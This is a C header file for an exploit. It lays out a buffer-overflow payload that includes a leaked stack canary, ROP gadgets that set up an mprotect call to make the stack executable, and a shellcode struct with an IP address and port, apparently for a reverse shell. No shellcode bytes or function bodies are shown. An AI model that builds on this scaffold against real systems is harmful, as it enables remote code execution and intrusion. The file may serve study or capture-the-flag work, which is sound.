#ifndef _PAYLOAD_H_
#define _PAYLOAD_H_
#include <arpa/inet.h>

#include "addresses.h"

typedef struct ShellCode {
	unsigned char	prolog[18];
	unsigned short	port;
	struct in_addr	ipAddress;
	unsigned char	epilog[50];
	unsigned short	unused;
} ShellCode, *ShellCodePtr;

typedef union ShellCodeUnion {
	unsigned char	raw[76];
	ShellCode	sc; 
} ShellCodeUnion, *ShellCodeUnionPtr;

typedef struct Payload {
	char		pl_dst[8];
	AddressUnion	pl_canary;
	AddressUnion	pl_rbp;
	AddressUnion	pl_popRDI;
	AddressUnion	pl_stackPage;
	AddressUnion	pl_popRSI;
	ptrdiff_t	pl_stackSize;
	AddressUnion	pl_popRDX;
	long		pl_permission;
	AddressUnion	pl_mprotect;
	AddressUnion	pl_shellCode;
	ShellCodeUnion	pl_scu;
} Payload, *PayloadPtr;

extern void initload(PayloadPtr plp);
extern void makeload(PayloadPtr plp, BaseAddressesPtr baseAddressesPtr);
extern void dumpload(PayloadPtr plp, BaseAddressesPtr baseAddressesPtr);
#endif
